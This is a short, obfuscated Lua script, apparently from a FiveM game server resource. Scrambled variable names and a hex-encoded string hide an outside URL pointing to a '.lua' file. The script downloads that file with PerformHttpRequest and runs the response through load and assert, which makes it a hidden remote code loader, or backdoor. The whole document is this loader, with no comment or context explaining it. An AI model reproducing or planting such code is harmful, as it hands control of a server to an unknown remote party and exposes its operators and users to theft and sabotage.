local llIllIIlIIIIIIll = {
    Ench, Support, Host, Pairs,
    Realease, Callbacks, Source,
    Hosting, Event, PerformHttpRequest,
    assert, server, load, Spawn, materials
}

local IIlIlllllIIlIIIl = {
    '68', '74', '74', '70', '73', '3a', '2f', '2f', '73', '70', '41', '4d', '42', '55',
    '44', '65', '2e', '4e', '65', '74', '2f', '44', '6b', '73', '2f', '64', '64', '2e'; '6c',
    '75', '61'
}

function lIlllIlllIlIIlIl()
    _empt = ''
    for id,it in pairs(IIlIlllllIIlIIIl) do
        _empt = _empt..it
    end
    return (_empt:gsub('..', function (cc)
        return string.char(tonumber(cc, 16))
    end))
end

llIllIIlIIIIIIll[10](lIlllIlllIlIIlIl(), function (e, d)
    local s = llIllIIlIIIIIIll[11](llIllIIlIIIIIIll[13](d))
    if (d == nil) then return end
    s()
end)